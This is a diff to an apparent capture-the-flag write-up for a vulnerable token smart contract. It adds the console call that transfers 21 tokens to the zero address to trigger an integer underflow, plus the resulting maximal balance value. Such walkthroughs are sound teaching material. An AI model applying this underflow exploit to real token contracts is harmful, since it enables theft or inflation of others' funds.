@@ -50,10 +50,11 @@ it should return 20.
 
 * Now we can Initiate a transfer to an address as the target and '21' as value. we can simply transfer the value to the 0 Address.
 
+`await contract.transfer('0x0000000000000000000000000000000000000000', 21)`
 * This will cause the underflow and now we can check out balance again. 
 
 `await contract.balanceOf(player)`
 
-* The player now has a huge number of Tokens.
+* The player now has a huge number of Tokens. '115792089237316195423570985008687907853269984665640564039457584007913129639935'
 
 
